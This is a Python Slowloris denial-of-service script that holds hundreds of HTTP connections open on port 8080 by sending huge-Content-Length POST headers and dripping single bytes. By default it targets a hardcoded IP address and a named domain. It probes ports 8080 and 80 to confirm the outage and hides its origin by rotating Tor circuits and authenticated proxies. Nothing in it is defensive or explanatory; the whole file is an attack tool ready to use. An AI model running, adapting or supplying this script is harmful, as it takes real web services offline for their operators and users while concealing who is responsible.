#!/usr/bin/env python3
"""
Slowloris HTTP connection exhaustion on port 8080.
Sends partial HTTP headers to hold server-side connections open.
Runs until Ctrl+C.

Two proof metrics:
  - probe_8080 : tries to open a fresh connection to :8080 each cycle
                 timeout/refused = pool exhausted
  - probe_80   : tries to open a fresh TCP connection to :80
                 timeout/refused = cross-port impact proven

Usage:
  python3 slowloris_8080.py
  python3 slowloris_8080.py --target 104.236.68.226 --port 8080 --connections 300
"""

import socket, select, threading, time, argparse
from datetime import datetime

import itertools

try:
    import socks as pysocks
    PYSOCKS_OK = True
except ImportError:
    PYSOCKS_OK = False

G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
C = "\033[0;36m"; B = "\033[1m"; W = "\033[0m"

COMPLETE_HEADERS = (
    b"POST / HTTP/1.1\r\n"
    b"Host: metoo-shatkin.com\r\n"
    b"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    b"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36\r\n"
    b"Accept: text/html,application/xhtml+xml\r\n"
    b"Content-Type: application/octet-stream\r\n"
    b"Content-Length: 999999999\r\n"
    b"\r\n"                         # headers complete — server allocates body buffer
)
DRIP_INTERVAL = 5   # seconds between each 1-byte drip


def probe_port(target, port, timeout=5):
    """Try to open a fresh TCP connection. Returns (connected:bool, latency_ms:float)."""
    s = socket.socket()
    s.settimeout(timeout)
    t0 = time.time()
    try:
        s.connect((target, port))
        ms = (time.time() - t0) * 1000
        s.close()
        return True, ms
    except socket.timeout:
        return False, timeout * 1000
    except ConnectionRefusedError:
        return False, (time.time() - t0) * 1000
    except Exception:
        return False, (time.time() - t0) * 1000


def _is_dead(s):
    """
    Check if server closed the connection on its side.
    select() readable + recv(1, PEEK) returning b'' = server closed.
    """
    try:
        r, _, _ = select.select([s], [], [], 0)
        if r:
            data = s.recv(1, socket.MSG_PEEK)
            return data == b''   # b'' = FIN received = server closed
        return False             # not readable = still open
    except Exception:
        return True


_tor_ctrl    = None
_tor_lock    = threading.Lock()
NEWNYM_EVERY = 50

_proxy_cycle = None   # itertools.cycle over [(ip,port,user,pwd), ...]
_proxy_lock  = threading.Lock()


def load_proxies(path):
    """Parse ip:port:user:pass lines, return list of tuples."""
    proxies = []
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            parts = line.split(":")
            if len(parts) == 4:
                ip, port, user, pwd = parts
                proxies.append((ip, int(port), user, pwd))
    return proxies


def _next_proxy():
    with _proxy_lock:
        return next(_proxy_cycle)


def _init_tor():
    global _tor_ctrl
    try:
        from stem.control import Controller
        _tor_ctrl = Controller.from_port(address="127.0.0.1", port=9051)
        _tor_ctrl.authenticate()
        print(f"  {G}[TOR]{W} ControlPort connected — NEWNYM every {NEWNYM_EVERY} connections")
    except Exception as e:
        print(f"  {Y}[TOR]{W} ControlPort unavailable ({e}) — circuit rotation disabled")


def _newnym():
    if _tor_ctrl:
        try:
            from stem import Signal
            _tor_ctrl.signal(Signal.NEWNYM)
            time.sleep(0.6)
        except Exception:
            pass


def open_slowloris_socket(target, port, use_tor=False, use_proxies=False):
    """
    Connect via Tor SOCKS5, HTTP CONNECT proxy, or direct.
    Sends complete headers with Content-Length: 999999999, drips body slowly.
    """
    try:
        if not PYSOCKS_OK and (use_tor or use_proxies):
            raise RuntimeError("pip3 install pysocks")
        if use_tor:
            s = pysocks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.set_proxy(pysocks.SOCKS5, "127.0.0.1", 9050)
        elif use_proxies:
            ip, port_p, user, pwd = _next_proxy()
            s = pysocks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            s.set_proxy(pysocks.HTTP, ip, port_p, username=user, password=pwd)
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((target, port))
        s.settimeout(None)
        s.send(COMPLETE_HEADERS)
        threading.Thread(target=_drip, args=(s,), daemon=True).start()
        return s
    except Exception:
        return None


def _drip(s):
    """Send 1 byte every DRIP_INTERVAL seconds to keep the body transfer alive."""
    while True:
        try:
            s.send(b'x')
            time.sleep(DRIP_INTERVAL)
        except Exception:
            return


def main():
    p = argparse.ArgumentParser()
    p.add_argument("--target",         default="104.236.68.226")
    p.add_argument("--port",           type=int, default=8080)
    p.add_argument("--connections",    type=int, default=300)
    p.add_argument("--check-interval", type=float, default=6.0)
    p.add_argument("--tor",            action="store_true",
                   help="Route via Tor SOCKS5 (127.0.0.1:9050)")
    p.add_argument("--proxy-file",     default=None,
                   help="ip:port:user:pass proxy list — each connection uses next proxy")
    args = p.parse_args()

    global _proxy_cycle
    if args.tor:
        _init_tor()
    if args.proxy_file:
        proxies = load_proxies(args.proxy_file)
        if not proxies:
            print(f"  {R}[ERROR]{W} No proxies loaded from {args.proxy_file}")
            return
        _proxy_cycle = itertools.cycle(proxies)
        print(f"  {G}[PROXY]{W} {len(proxies)} proxies loaded — rotating per connection")

    pool  = []
    lock  = threading.Lock()
    stop  = threading.Event()

    print(f"""
{B}{'='*62}{W}
  Slowloris — partial HTTP header exhaustion on :{args.port}
{B}{'='*62}{W}
  Target      : {args.target}:{args.port}
  Connections : {args.connections} (slow POST body, auto-refill dead)
  Proxy       : {"Tor SOCKS5 — NEWNYM every "+str(NEWNYM_EVERY)+" conns" if args.tor else (args.proxy_file+" (rotating)" if args.proxy_file else "direct")}
  Proof       : probe_8080 + probe_80 fresh-connect each cycle
{B}{'='*62}{W}
""")

    def fill_pool():
        opened_total = 0
        while not stop.is_set():
            with lock:
                dead = [s for s in pool if _is_dead(s)]
                for s in dead:
                    pool.remove(s)
                    try: s.close()
                    except: pass
                needed = args.connections - len(pool)

            for _ in range(needed):
                if stop.is_set():
                    break
                if args.tor and opened_total % NEWNYM_EVERY == 0 and opened_total > 0:
                    with _tor_lock:
                        _newnym()
                s = open_slowloris_socket(args.target, args.port,
                                          use_tor=args.tor,
                                          use_proxies=bool(args.proxy_file))
                if s:
                    with lock:
                        pool.append(s)
                    opened_total += 1
            time.sleep(1)

    def status_loop():
        while not stop.is_set():
            time.sleep(args.check_interval)
            with lock:
                held = len(pool)

            ts = datetime.now().strftime("%H:%M:%S")

            ok_8080, ms_8080 = probe_port(args.target, args.port)
            ok_80,   ms_80   = probe_port(args.target, 80)

            p8 = f"{G}OPEN {ms_8080:.0f}ms{W}" if ok_8080 else f"{R}BLOCKED {ms_8080:.0f}ms{W}"
            p80 = f"{G}OPEN {ms_80:.0f}ms{W}"  if ok_80   else f"{R}BLOCKED {ms_80:.0f}ms{W}"

            print(f"  {ts} | held={held:>3} | probe_8080={p8} | probe_80={p80}")

    threading.Thread(target=fill_pool,   daemon=True).start()
    threading.Thread(target=status_loop, daemon=True).start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n  {Y}[STOPPED]{W} Ctrl+C\n")
        stop.set()
        with lock:
            for s in pool:
                try: s.close()
                except: pass


if __name__ == "__main__":
    main()
